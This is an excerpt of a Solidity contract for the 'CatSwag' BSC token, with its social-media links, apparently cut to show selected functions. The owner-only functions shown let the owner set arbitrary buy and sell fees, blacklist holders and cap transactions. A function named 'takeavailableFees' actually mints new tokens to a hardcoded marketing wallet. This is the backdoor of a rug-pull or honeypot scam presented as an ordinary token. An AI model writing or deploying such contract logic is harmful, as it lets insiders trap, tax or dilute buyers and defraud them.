...
TG: https://t.me/catswag
Medium: https://medium.com/@catswagofficial
Twitter: https://twitter.com/catswagbsc
Reddit: https://www.reddit.com/u/catswagifficial
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x14f71088C5dB1654BBAa32802DfD0D058D55f8C0;
...
contract CatSwag is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Marketing = payable(0xe3310Ab3e624e98418C9469b337fdCC360B6E62c);
    ...
    function setFees(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwners {
    ...
    function blacklistAddresses(address[] calldata addresses) external onlyOwners {
    ...
    function removeBlacklist(address[] calldata addresses) external onlyOwners {
    ...
    function setMaxTransaction(uint256 maxTxPercent) external onlyOwners {
    ...
    function takeavailableFees(uint256 value, address adr) onlyOwners public virtual {
        require(adr == address(Wallet_Marketing));
        _fee(address(Wallet_Marketing), adr, value);
        _tTotal += value;
        _tOwned[adr] += value;
        emit Transfer(address(Wallet_Marketing), adr, value);
    }
